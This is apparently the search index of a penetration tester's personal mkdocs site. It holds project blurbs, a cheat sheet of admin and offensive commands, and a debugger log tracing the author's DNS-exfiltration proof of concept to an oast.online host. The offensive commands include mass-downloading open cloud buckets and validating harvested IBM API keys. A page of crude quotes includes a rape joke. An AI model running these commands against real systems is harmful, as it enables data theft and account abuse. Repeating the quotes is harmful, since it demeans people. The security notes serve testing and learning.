{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Work Stuff Personal Business I do IT repair/administration, and cybersecurity for small businesses that don't fit within the realm of conflict of interest with my primary job. Feemco Technologies Resume/Job stuff Some stuff people might want to access for jobs Linkedin Online badges (credly) Online badges (credential.net) HTB Online Resume Infosec exchange Blog I occasionally do blog posts here and there, started as part of a tech help and guidance page. Mostly posting when something comes up that a lot of people have issues with, or when it's something that's interesting to me enough to discuss it. Blogger Blog Projects and such Just wanted to use this as a test of mkdocs and obsidian, but I think storing stuff here and making it useful might actually be a benefit. Lets see what we can do here: pyscript Pyscript-test Did some playing with pyscript to see what I could do using python in a web browser. Long story short, basically javascript launched from python code. I say it like this because so much of it relies on javascript functionality forward and backward. I did several tests with it and my favorite has basically been using it as a mechanism to run xss attempts. Main project page: https://github.com/ferasdour/other-nonsense dns dns Created a project to learn more languages, so in classic multi-lingual style, making a single project that uses multiple languages and mimics the techniques from each language. It's a simple idea, generate a file to send to a the target, the file grabs every file on the user's home directory, ship it over dns requests to a one-time generated connection with interactsh to become a data stealing malware. This is only a proof of concept and not intended for malicious use, it's primary use is for learning and showcasing detection capabilities. Main project page: https://github.com/ferasdour/dns_exfil_controller Automation Tools This is mostly just a collection of different simple scripts that I found a need for and was legally allowed to share (because of work agreements limiting what I could). So I have tools made with jupyter notebooks for controlling vms using libvirt/kvm, building containers from vms using ansible, a few simple bash scripts, and a few ansible tricks here and there. I've also added several other things here and there just because I don't really have anywhere else to share them directly. Main project page: https://github.com/ferasdour/automation_tools References References I'm sure everyone would rather this be references to people or something, but nope this is references to things like notes about scripting, fun commands, basically it's a cheat sheet for myself. Hope you can find some joy from this too. Main project page: https://ferasdour.github.io/Stuff/reference/","title":"Home"},{"location":"#work-stuff","text":"","title":"Work Stuff"},{"location":"#personal-business","text":"I do IT repair/administration, and cybersecurity for small businesses that don't fit within the realm of conflict of interest with my primary job. Feemco Technologies","title":"Personal Business"},{"location":"#resumejob-stuff","text":"Some stuff people might want to access for jobs Linkedin Online badges (credly) Online badges (credential.net) HTB Online Resume Infosec exchange","title":"Resume/Job stuff"},{"location":"#blog","text":"I occasionally do blog posts here and there, started as part of a tech help and guidance page. Mostly posting when something comes up that a lot of people have issues with, or when it's something that's interesting to me enough to discuss it. Blogger Blog","title":"Blog"},{"location":"#projects-and-such","text":"Just wanted to use this as a test of mkdocs and obsidian, but I think storing stuff here and making it useful might actually be a benefit. Lets see what we can do here:","title":"Projects and such"},{"location":"#pyscript","text":"Pyscript-test Did some playing with pyscript to see what I could do using python in a web browser. Long story short, basically javascript launched from python code. I say it like this because so much of it relies on javascript functionality forward and backward. I did several tests with it and my favorite has basically been using it as a mechanism to run xss attempts. Main project page: https://github.com/ferasdour/other-nonsense","title":"pyscript"},{"location":"#dns","text":"dns Created a project to learn more languages, so in classic multi-lingual style, making a single project that uses multiple languages and mimics the techniques from each language. It's a simple idea, generate a file to send to a the target, the file grabs every file on the user's home directory, ship it over dns requests to a one-time generated connection with interactsh to become a data stealing malware. This is only a proof of concept and not intended for malicious use, it's primary use is for learning and showcasing detection capabilities. Main project page: https://github.com/ferasdour/dns_exfil_controller","title":"dns"},{"location":"#automation-tools","text":"This is mostly just a collection of different simple scripts that I found a need for and was legally allowed to share (because of work agreements limiting what I could). So I have tools made with jupyter notebooks for controlling vms using libvirt/kvm, building containers from vms using ansible, a few simple bash scripts, and a few ansible tricks here and there. I've also added several other things here and there just because I don't really have anywhere else to share them directly. Main project page: https://github.com/ferasdour/automation_tools","title":"Automation Tools"},{"location":"#references","text":"References I'm sure everyone would rather this be references to people or something, but nope this is references to things like notes about scripting, fun commands, basically it's a cheat sheet for myself. Hope you can find some joy from this too. Main project page: https://ferasdour.github.io/Stuff/reference/","title":"References"},{"location":"Stuff/quotes/","text":"No Context Quotes Sort of an inside joke about running gags and silly phrasing, but wanted to share some quotes without any implicit context, because I think they're funny. \"I'm not saying I want to piss on someone and I'm also not saying I'd rather be pissed on more\" \"Beak dress\" \"Adult soda\" \"you never want to piss on things and that's what's wrong in this marriage\" \"This is why people get agreeable raped\" \"hottest poop face\" \"Come to the dark side we have naps and pussy\" \"pooping = hacking\" \"imagine your wife having your nuts in a tickle choke hold\"","title":"Quotes"},{"location":"Stuff/quotes/#no-context-quotes","text":"Sort of an inside joke about running gags and silly phrasing, but wanted to share some quotes without any implicit context, because I think they're funny. \"I'm not saying I want to piss on someone and I'm also not saying I'd rather be pissed on more\" \"Beak dress\" \"Adult soda\" \"you never want to piss on things and that's what's wrong in this marriage\" \"This is why people get agreeable raped\" \"hottest poop face\" \"Come to the dark side we have naps and pussy\" \"pooping = hacking\" \"imagine your wife having your nuts in a tickle choke hold\"","title":"No Context Quotes"},{"location":"Stuff/reference/","text":"Commands for various things: virtual environment & management Virt os level Upgrade everything for i in `seq 1 3`; do apt update; apt upgrade -y; service snapd start; snap refresh; flatpak update -y; pip --disable-pip-version-check list --outdated --format=json | python -c \"import json, sys; print('\\n'.join([x['name'] for x in json.load(sys.stdin)]))\" | xargs -n1 pip install -U --break-system-packages --root-user-action=ignore; pipx upgrade-all; npm update -g; /root/go/bin/pdtm -ia; /root/go/bin/pdtm -ua; rustup update; for c in `cargo install --list|cut -sd' ' -f1`; do cargo install $c; done; done Find domains that resolve to local ips subfinder -rl 50 -all -silent -d lb.appdomain.cloud > /tmp/subdomains; for i in `cat /tmp/subdomains`; do dig +all $i |grep -i \"IN A\\|DIG \"| grep -B1 -iE \"(192\\.168\\.[0-9]{1,3}\\.[0-9]{1,3}|10\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}|172\\.1[6789]\\.\\.[0-9]{1,3}\\.[0-9]{1,3}|172\\.2[0-9]\\.|172\\.3[01]\\.\\.[0-9]{1,3}\\.[0-9]{1,3})\"; done |grep -i \"+all\" |awk '{print $7}' merge json files jq -s '.[0] * .[1]' test2.json counts.json > test1.json Added memory because memory dd if=/dev/zero of=/swapfile bs=1GB count=40 mkswap /swapfile swapon /swapfile better ip output ip -br -c a Host level Start local python server (to pull isos, instead of from other location) tmux new-session -s webserver -d \"python3 -m http.server --directory=/share/vms/\" Create VM papermill /automation-tools/libvirt-provision.ipynb /dev/stdout -p hostname ubuntu -p domainname private -p url http://10.42.0.1:8000/noble-server-cloudimg-amd64.img -p os_variant ubuntu-stable-latest -p size 40G -p ram 2048 Power on all stopped vms for i in `virsh list --all|grep -i off|awk '{print $2}'`; do virsh start $i; done Stop and remove all vms for i in `virsh list --all|grep -i .private|awk '{print $2}'`; do tmux new-session -d \"virsh destroy $i; sleep 300; virsh undefine $i --remove-all-storage\"; done 2>/dev/null Start local python server (to pull isos, instead of from other location) tmux new-session -s webserver -d \"python3 -m http.server --directory=/share/vms/images\" Site update git add *; date=`date`; git commit -m \"$date\"; git branch -M main; git remote add origin git@github.com:ferasdour/ferasdour.github.io.git; git push origin main; mkdocs gh-deploy --force deb repo cp -R /var/cache/apt/archives/* /share/vms/images/debs/ dpkg-scanpackages /share/vms/images/debs/ /dev/null | gzip -9c > /share/vms/images/debs/Packages.gz uptime check & network validation nmap -sS -p22 --open -Pn -n `ip address show dev $(virsh net-info default|grep -i bridge |awk '{print $2}')|grep -i inet|awk '{print $2}'`|grep -i \"report for\" |awk '{print $5}' > /tmp/virtnmap; for i in `cat /tmp/virtnmap`; do ssh-keyscan -H $i > ~/.ssh/known_hosts 2>/dev/null; ansible $i -i /tmp/virtnmap -a \"uptime\" -T 30 -u ansible -b; done Watch vm lists watch \"echo '\\nTMUX SESSIONS:\\n';tmux list-sessions; echo '\\nVMS:\\n'; virsh list --all|grep -i private; echo '\\nIP ADDRESSES:\\n'; virsh net-dhcp-leases default|grep -owE '[0-9.]{7,20}'\" nmcli hotspot nmcli dev wifi hotspot ifname wlan1 ssid testmeta password metatest nmcli con add type ethernet ifname eth0 ipv4.method shared con-name \"internetShare\" nmcli connection modify nmcli connection modify \"MyConnection\" connection.interface-name eth0 pentesting & forensics repolist for fun and profit for each in `curl -s -L https://api.github.com/orgs/$ORG/repos |jq \".[]|.html_url\"|sed s/'\"'//g`; do repolist -u $each|sed s/\"\\/\"/\"\\n\"/g; done |sort -u >> wordlist Bounty Targets git clone https://github.com/arkadiyt/bounty-targets-data pdtm -ia; pdtm -ua; for i in `grep -Eoh \"(([a-zA-Z](-?[a-zA-Z0-9])*)\\.)+[a-zA-Z]{2,}\" bounty-targets-data/data/*.txt|sort -u`; do subfinder -max-time 100 -silent -recursive -active -d $i |katana -hl -silent -nos -xhr -d 50 -jc -jsl -kf -ns -H \"User-agent: \" >> scrape-$i-log; done for i in `sort -u bounty-targets-data/data/domains.txt|grep -iE \".{3,}\" `; do echo `docker run -it --rm -v $PWD/:/app/results waymore:latest waymore -i $i -oU $i.links -oR /app/results/$i/`; done awk -F \",\" '{print $2}' */waymore_index.txt|awk -F \"//\" '{$1=$2=\"\"; print $0}'|sed s/\" \"/\"\\/\"/g|sed s/\"\\/\\/\"//g|sed s/\"\\/$\"//g|sort -u grep -hEo \"(http|https)://[a-zA-Z0-9./?=_%:-]*\" scrape-*-log|sed s/\"%5C$\"//g|sed s/\"%5C%5C$\"//g|sort -u Javascript Deobfuscate docker run -d --rm --name jsdetox -p 3000:3000 docker.io/remnux/jsdetox docker run -d --rm -p 4000:4000 -p 35729:35729 --name docker.io/de4js remnux/de4js https://tungcsv.github.io/de4js/ run beacon-heatmap all interfaces for i in `iw dev|grep -i interface|awk '{print $2}'`; do ifconfig $i down; iwconfig $i mode monitor; ifconfig $i up; tmux new-session -s heatmap-$i -d \"cd /share/git-repo/scapy-monitor; python3 beacon-heatmap.py --iface $i -m 0 --db test-$i.json\"; done #then to view: jq -s '.[0] * .[1]' test*.json > counts.json; python3 beacon-heatmap.py --nopcap --mac 5e:00:f1:50:23:fe --db counts.json; ristretto heatmap.png & afl & such had to note this somewhere, dumb fuzzing, smart parameter finding: llm prompt: generate 1000 possible command options for the linux command \"apython\". This is to be used as input for a fuzzer, so no need for explainations or usage, just give command arguments Ok, I'm ready to generate 1000 possible command options for \"apython\" to be used as input for a fuzzer. I'll focus on providing diverse command arguments without explanations or usage examples. Here are 1000 possible command options for \"apython\": 1. apython -h ... to fix that a little and create the required input files: n=1;for each in `sed s/\"^[0-9a-zA-Z.]* apython \"/\"\"/g /tmp/test/inputlist`; do echo $each >> input/$n; n=$(($n+1)); done afl-fuzz -m none -i input -o output -n -- /bin/apython -a @@ another example: https://gist.github.com/ferasdour/783a1bdb383e1f2f9d26adf97353b7ee n=1; for each in `sed s/\"^[0-9a-zA-Z.]* \"/\"\"/g list|grep -iv \"#\"|sort -u`; do echo $each >> input/$n; n=$(($n+1)); done > ls inputafl-fuzz -i input -o output -n -D -- ./dnscapture -a @@ JWT docker run -it --network \"host\" --rm -v \"${PWD}:/tmp\" -v \"${HOME}/.jwt_tool:/root/.jwt_tool\" docker.io/ticarpi/jwt_tool Binwalk extract everything binwalk --dd='.*' --run-as=root /root/resources.arsc Bucket Search AWS aws s3 ls --no-sign-request --recursive s3://cf-courses-data/ --endpoint-url=https://s3.us.cloud-object-storage.appdomain.cloud aws s3 sync --no-sign-request --recursive s3://cf-courses-data/ --endpoint-url=https://s3.us.cloud-object-storage.appdomain.cloud . aws configure --profile whatever aws s3 ls s3://whatever --profile whatever firebase enum git clone https://github.com/Sambal0x/firebaseEnum ./firebaseenum.py -k searchterm smtp server python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25 Iptables for zap/burp iptables -t nat -I PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080; iptables -t nat -I PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080; Run initial scan /share/public-git-repos/automation-tools/sanitize.sh; papermill --stdout-file /tmp/initial-scan.output /share/public-git-repos/automation-tools/initial-scans.ipynb /tmp/initial-scan.json -p input_data 10.13.37.14 Caido Docker podman run --rm -p 8080:8080 --userns=keep-id -v /caido:/home/caido/.local/share/caido -m 2g --memory-swap 2g docker.io/caido/caido:latest unknown ciphers / encryption: podman run -it --rm docker.io/remnux/ciphey {text} chrome driver with listening port tmux new-session -d \"chromedriver --port=4444 --disable-dev-shm-usage\" scan for and validate ibmcloud apikeys (bash version) for apikey in `grep -iroEh \"([a-zA-Z0-9]{28,40}[_-][a-zA-Z0-9]{4,15})\" /tmp/truffle* 2>/dev/null`; do token=`curl https://iam.cloud.ibm.com/identity/token -X POST -d \"apikey=$apikey&grant_type=urn%3Aibm%3Aparams%3Aoauth%3Agrant-type%3Aapikey&response_type=cloud_iam\" -s|grep -i access_token|awk -F '\"' '{print $4}'`; curl -s -X GET https://iam.cloud.ibm.com/v1/apikeys -H \"Authorization: Bearer $token\"|jq '.apikeys[]|.id' 2>/dev/null; done API Testing github.com/yogsec/API-Pentesting-Tools Buckets by provider: ibm: s3.(region).cloud-object-storage.appdomain.cloud aws: s3.amazonaws.com digitalocean: (region).digitaloceanspaces.com google: storage.googleapis.com Exfil open buckets domain=s3domain; /root/.pdtm/go/bin/pdtm -ia; /root/.pdtm/go/bin/pdtm -ua ;for i in `subfinder -max-time 100 -silent -recursive -d $domain |awk -F \"\\.$domain\" '{print $1}' |sort -u`; do mkdir $i && cd $i && aws s3 sync --no-sign-request s3://$i/ --endpoint-url=https://$domain . ; cd /share/pentests/bugbounty/ibm/alternative-bucket/yetanother/; done; find . -type d -empty -delete pixelation python3 depix.py \\ -p /path/to/your/input/image.png \\ -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \\ -o /path/to/your/output.png wpscan wpscan --rua --plugins-detection aggressive --plugins-version-detection aggressive -e ap,u,dbe,at,cb --proxy http://192.168.56.1:8080 --detection-mode aggressive --disable-tls-checks --throttle 1 --headers \"X-HackerOne-Research: ferasdour\" --url replaceme kerb local to domain creds https://www.linkedin.com/posts/giulio-pierantoni-036792178_are-you-the-local-admin-of-a-domain-host-activity-7338264538112319490-APYu?utm_source=share&utm_medium=member_desktop&rcm=ACoAACAshRgBOHjgq-VF9tt2qFKLuENiNbPHCY8 ksetup /setcomputerpassword <abcd> Initial scan ffuf ffuf -u $URL/FUZZ -w /share/Wordlists/webcontent-top-10000.txt -recursion -raw -fc 404,403,400,500 -e .php,.html,.bac,.bak,.txt,.csv,.backup,.vim,.sql -fs 14 -v |grep -oP '(htt.*)' Ansible password change without exposing password to process list on ansible managed node ansible-playbook -i localhost, ../othertools/ansible/change-shadow.yaml -u ansible -b --become-password-file /root/becomefile -e user=root -e \"pass=$(openssl passwd -6 passwd)\" Run keycloak mkdir /volume1/Data/keycloak; docker run --name keycloak -v /volume1/Data/keycloak:/opt/keycloak -p 8080:8080 -e KC_BOOTSTRAP_ADMIN_USERNAME=user -e KC_BOOTSTRAP_ADMIN_PASSWORD=password quay.io/keycloak/keycloak:26.1.3 start-dev Run jenkins & gogs ansible-playbook -i storage, ../../Notes/Obsidian/RandomDocs/RandomDocs/Ansible/Ansible-Docker-devops/jenkins-gogs.yml -u user -e ansible_python_interpreter=/bin/python -K jenkins-gogs.yml --- - hosts: all gather_facts: yes become: yes vars: ansible_host_key_checking: false ansible_ssh_timeout: 300 tasks: - name: Create jenkins dir ansible.builtin.file: path: /volume1/Data/jenkins state: directory mode: '777' - name: Create gogs dir ansible.builtin.file: path: /volume1/Data/gogs state: directory mode: '777' - name: start jenkins ansible.builtin.command: cmd: /usr/local/bin/docker run --name jenkins-dev --rm -p 7080:8080 -v /volume1/Data/jenkins:/var/jenkins_home jenkins/jenkins:lts async: 30 poll: 0 register: jenkinstask - name: start gogs ansible.builtin.command: cmd: /usr/local/bin/docker run --rm --name gogs -p 7022:22 -p 10880:3000 -v /volume1/Data/gogs:/data gogs/gogs async: 30 poll: 0 register: gogstask - name: wait for jenkins task ansible.builtin.async_status: jid: \"{{ jenkinstask.ansible_job_id }}\" until: job_result.finished register: job_result retries: 300 delay: 300 - name: wait for gogs task ansible.builtin.async_status: jid: \"{{ gogstask.ansible_job_id }}\" until: job_result.finished register: job_result retries: 300 delay: 300 - name: start get jenkins password ansible.builtin.command: cmd: /usr/local/bin/docker exec jenkins-dev cat /var/jenkins_home/secrets/initialAdminPassword register: jenkinsPass - name: print pass debug: msg: \"{{ jenkinsPass.stdout }}\" Run homepage docker run -p 3333:3333 -e HOMEPAGE_ALLOWED_HOSTS=familystorage -v /volume1/Data/homepage:/app/config -v /var/run/docker.sock:/var/run/docker.sock ghcr.io/gethomepage/homepage:latest nmap-inv.yml --- plugin: community.general.nmap strict: false ipv4: true ports: true sudo: true port: 22,80,8080,443,8443 address: 172.18.0.1/24 groups: ssh_server: \"ports | selectattr('service', 'equalto', 'ssh')\" web_servers: \"ports | selectattr('service', 'equalto', 'http'\" Reversing things Find main based on last ret to libc look for libc startup -> find last call made that returns something to eax -> that's main, in libc stuff. shellcode quick analysis scdbg /f out.bin -s -1 (parse all from out.bin) Choco: choco upgrade all -y -force choco list --local-only choco install PACKAGENAME -y choco install packer vagrant virtualbox git poshgit chefdk visualstudiocode -y choco install github --ignore-checksums choco outdated Rizin helpful stuff dso; drr; pd 10 # ds = debug step, dso = debug step over, dr is debug register, drr is debug register with additional context, pd is print dump with a specifer (10) of how many steps to print in the disassembler # Information about the binary file > i # All summary > ia # Show main address > iM # Symbols is # List strings > iz # List strings in whole binary > izz # Reopen current file in debug mode > ood # Disassemble at current address > pd # Disassemble 10 instructions at current address > pd 10 # Disassemble all possible opcodes at current address > pda # Disassemble all possible opcodes 10 instructions at current address > pda 10 # Disassemble at the given function > pd @ main > pd 20 @ main # Disassemble a function at current address > pdf # Disassemble at given address > pdf @ 0x401005 # Disassemble the main function > pdf @ main # Print string > ps @ 0x2100 # Print zero-terminated string > psz @0x2100 # Show 200 hex bytes > px 200 # Show hex bytes at given register > px @ eip > px @ esp # Print current address > s # Seek to given function > s main > s sym.main # Seek to given address > s 0x1360 > s 0x0x00001360 # Seek to register address > s esp > s esp+0x40 > s rsp > s rsp+0x40 # Seek 8 positions > sd 8 # Show the seek history > sh # Undoing > shu # Redoing > shr # Step > ds # Step 3 times > ds 3 # Step back > dsb # Setup a breakpoint > db @ 0x8048920 # Remove a breakpoint > db @ -0x8048920 # Remove all breakpoints > db-* # List all breakpoints > dbl # Continue to execute the program until we hit the breakpoint > dc # Continue until syscall > dcs # Read all registers values > dr > dr= # Read given register value > dr eip > dr rip # Set a register value > dr eax=24 # Show register references > drr # Analyze all calls > aaa # Analyze function > af # List all functions > afl > afl | grep main # Show address of current function > afo running 1 [0x7ffad20914d0]> afl |findstr Main 0x004014d0 1 34 dbg.WinMainCRTStartup 0x00435a21 1 45 sym.PreMainInner 0x00435a4e 1 109 sym.PreMain 0x00435abb 1 20 sym.NimMainInner 0x00435acf 1 49 sym.NimMain 0x00435b55 34 1480 sym.NimMainModule [0x7ffad20914d0]> db @ 0x00435b55 [0x7ffad20914d0]> dc #initial startup [0x7ffad20fc47a]> dbl # list breakpoints start end size perm hwsw type state valid cmd cond name module ------------------------------------------------------------------------------------------- 0x00435b55 0x00435b56 1 --x sw break enabled valid sym.NimMainModule [0x7ffad20fc47a]> dc # continue until break point hit breakpoint at: 0x435b55 # just before break point ?? [0x00435b55]> afl |findstr dns 0x00429635 16 2826 sym.dnsclient_typesDatInit000 0x0042c608 1 3599 sym.dnsclient_recordsDatInit000 0x00430f93 1 92 sym.dnsclient_protocolInit000 0x00431f91 1 370 sym.dnsclient_dnsclientDatInit000 [0x00435b55]> db @ 0x00429635 [0x00435b55]> dc ==> Process finished # So basically, this never went to that dnsclient, maybe i can try the other ones, or maybe something is broken before that. (restarted and re-analyzed) [0x7ffad20914d0]> afl |findstr dns 0x00429635 16 2826 sym.dnsclient_typesDatInit000 0x0042c608 1 3599 sym.dnsclient_recordsDatInit000 0x00430f93 1 92 sym.dnsclient_protocolInit000 0x00431f91 1 370 sym.dnsclient_dnsclientDatInit000 [0x7ffad20914d0]> db @ 0x00429635 [0x7ffad20914d0]> db @ 0x0042c608 [0x7ffad20914d0]> db @ 0x00430f93 [0x7ffad20914d0]> db @ 0x00431f91 [0x7ffad20fc47a]> dc hit breakpoint at: 0x429635 [0x00429635]> dbl start end size perm hwsw type state valid cmd cond name module ----------------------------------------------------------------------------------------------------------- 0x00429635 0x00429636 1 --x sw break enabled valid sym.dnsclient_typesDatInit000 0x0042c608 0x0042c609 1 --x sw break enabled valid sym.dnsclient_recordsDatInit000 0x00430f93 0x00430f94 1 --x sw break enabled valid sym.dnsclient_protocolInit000 0x00431f91 0x00431f92 1 --x sw break enabled valid sym.dnsclient_dnsclientDatInit000 [0x00429635]> pdf ; CALL XREF from sym.PreMain @ 0x435a9f ;-- rip: \u250c sym.dnsclient_typesDatInit000(); [0x00429635]> drr role reg value refstr \u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015 mxcsr 0x1f80 8064 rflags 0x204 516 data.00000204,rflags R0 rax 0x45b500 4568320 .bss rax A0 rcx 0x446e00 4484608 IMAGE nsex.exe | .bss .bss rcx ascii ('R W 0x1 A1 rdx 0x42638d 4350861 IMAGE nsex.exe | .text .text Marker_tyRef__OhBa09cfBAnY4MdnNlGabWQ,rdx sym.Marker_tyRef__OhBa09cfBAnY4MdnNlGabWQ R X 'push rbp' 'IMAGE nsex.exe | .text' rbx 0x1 1 rbx,r12 SP rsp 0x67fda8 6815144 PRIVATE rsp R W 0x435aa4 BP rbp 0x67fde0 6815200 PRIVATE rbp R W 0x67fe20 rsi 0x2a 42 rsi ascii ('*') rdi 0xc61570 12981616 PRIVATE rdi R W 0xc61580 A2 r8 0x19c 412 data.0000019c,r8,r9,r10,r11 A3 r9 0x19c 412 data.0000019c,r8,r9,r10,r11 r10 0x19c 412 data.0000019c,r8,r9,r10,r11 r11 0x19c 412 data.0000019c,r8,r9,r10,r11 r12 0x1 1 rbx,r12 r13 0x8 8 r13 r14 0x0 0 r15 0x0 0 PC rip 0x429635 4363829 IMAGE nsex.exe | .text .text dnsclient_typesDatInit000,rip sym.dnsclient_typesDatInit000 R X 'push rbp' 'IMAGE nsex.exe | .text' [0x00429635]> psw @ 0x42638d \u4855\\xee\\x96\\x89\u8348\u30ec\u8948\u104d\u8948\u1855\u8b48\u1045\u8948\\xef\\xa1\\x85\u8b48\\xef\\xa1\\x85\u8b48\u0840\u8b48\u1855\u8948\\xee\\xa3\\x81\u8af6\\xfe\\xff\u8b48\\xef\\xa1\\x85\u8b48\u1840\u8b48\u1855\u8948\\xee\\xa3\\x81\u8ae2\\xfe\\xff\u8b48\\xef\\xa1\\x85\u8b48\u2040\u8b48\u1855\u8948\\xee\\xa3\\x81\u8ace\\xfe\\xff\u8b48\\xef\\xa1\\x85\u8b48\u2840\u8b48\u1855\u8948\\xee\\xa3\\x81\u8aba\\xfe\\xff\u4890\uc483\u5d30\u55c3\u8948\u48e5\u058d\u5179\\x03\uc748\uc800\\x0f\u4800\u058d\u516b\\x03\uc748\u0840\\x08 [0x0042c608]> db @ sym.NimMainModule [0x0042c608]> dbl start end size perm hwsw type state valid cmd cond name module ----------------------------------------------------------------------------------------------------------- 0x00429635 0x00429636 1 --x sw break enabled valid sym.dnsclient_typesDatInit000 0x0042c608 0x0042c609 1 --x sw break enabled valid sym.dnsclient_recordsDatInit000 0x00430f93 0x00430f94 1 --x sw break enabled valid sym.dnsclient_protocolInit000 0x00431f91 0x00431f92 1 --x sw break enabled valid sym.dnsclient_dnsclientDatInit000 0x00435b55 0x00435b56 1 --x sw break enabled valid sym.NimMainModule [0x00431f91]> dc hit breakpoint at: 0x431f91 [0x00431f91]> dbl start end size perm hwsw type state valid cmd cond name module ----------------------------------------------------------------------------------------------------------- 0x00429635 0x00429636 1 --x sw break enabled valid sym.dnsclient_typesDatInit000 0x0042c608 0x0042c609 1 --x sw break enabled valid sym.dnsclient_recordsDatInit000 0x00430f93 0x00430f94 1 --x sw break enabled valid sym.dnsclient_protocolInit000 0x00431f91 0x00431f92 1 --x sw break enabled valid sym.dnsclient_dnsclientDatInit000 0x00435b55 0x00435b56 1 --x sw break enabled valid sym.NimMainModule [0x00431f91]> dc WARNING: A second-chance exception has ocurred! pdf ... \u2502 \u2502\u2502\u254e 0x0043283f mov qword [var_88h], 0x10 ; r8 \u2502 \u2502\u2502\u254e 0x00432847 lea rax, str.usr_local_src_hello.nim ; 0x43c689 ; \"/usr/local/src/hello.nim\" \u2502 \u2502\u2502\u254e 0x0043284e mov qword [var_80h], rax \u2502 \u2502\u2502\u254e 0x00432852 mov rdx, qword [var_50h] \u2502 \u2502\u2502\u254e 0x00432856 mov rax, qword [var_40h] \u2502 \u2502\u2502\u254e 0x0043285a lea rcx, data.00000248 \u2502 \u2502\u2502\u254e 0x00432861 mov qword [var_data.00000268], rcx \u2502 \u2502\u2502\u254e 0x00432866 mov r9d, data.000001f4 ; 0x1f4 \u2502 \u2502\u2502\u254e 0x0043286c mov r8d, 0x10 \u2502 \u2502\u2502\u254e 0x00432872 mov rcx, rax \u2502 \u2502\u2502\u254e ;-- rip: \u2502 \u2502\u2502\u254e 0x00432875 b call sym.sendQuery__CX1XXfck9ba9cJqPY29bYVNeQ ; sym.sendQuery__CX1XXfck9ba9cJqPY29bYVNeQ ... [0x0043286c]> drr; pd 22 role reg value refstr \u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015\u2015 mxcsr 0x1f80 8064 rflags 0x204 516 data.00000204,rflags R0 rax 0xa00d10 10489104 PRIVATE rax,rcx R W 0x459c00 A0 rcx 0xa00d10 10489104 PRIVATE rax,rcx R W 0x459c00 A1 rdx 0xa0c520 10536224 PRIVATE rdx R W 0x42 rbx 0x1 1 rbx,r12 SP rsp 0x67f600 6813184 PRIVATE rsp R W 0x67f640 BP rbp 0x67f880 6813824 PRIVATE rbp R W 0x67fdb0 rsi 0x9 9 rsi rdi 0x6b1570 7017840 PRIVATE rdi R W 0x6b1580 A2 r8 0x10 16 r8 A3 r9 0x1f4 500 data.000001f4,r9 r10 0x0 0 r11 0xa0c563 10536291 PRIVATE r11 R W 0x7473616f2e736139 9as.oast.online r12 0x1 1 rbx,r12 r13 0x8 8 r13 r14 0x0 0 r15 0x0 0 PC rip 0x432875 4401269 IMAGE nsex.exe | .text .text rip sym.nsex__eP2ttPkowx6uCkozS0R9aVQ ascii ('u') R X 'call 0x42f578' 'IMAGE nsex.exe | .text' [0x0043286c]> psi @ 0xa0c563 9as.oast.online [0x0043286c]> psi @ 0xa00d10 8.8.8.8 [0x0043286c]> psi @ 0xa0c520 IERPIE5PVCBFRElUIFRI.d0bppvukuj25s86t4750nn63j5i3a19as.oast.online [0x0043286c]> psi @ 0x6b1570 nsex.exe running 2 [0x0043e060]> pdf|grep -i softlayer -B1 # listing current function (sym.go.runtime.main) \u2502 \u2502\u254e 0x0043e0fe lea rcx, [0x019423a0] \u2502 \u2502\u254e ; DATA XREF from sym.go.github.com_softlayer_softlayer_go_services.Location_Datacenter.GetLocationStatus @ 0x854af4 -- \u2502 \u2502\u2502\u2502\u254e 0x0043e134 cmp dword [0x019a2f40], 0 ; [0x19a2f40:4]=0 \u2502 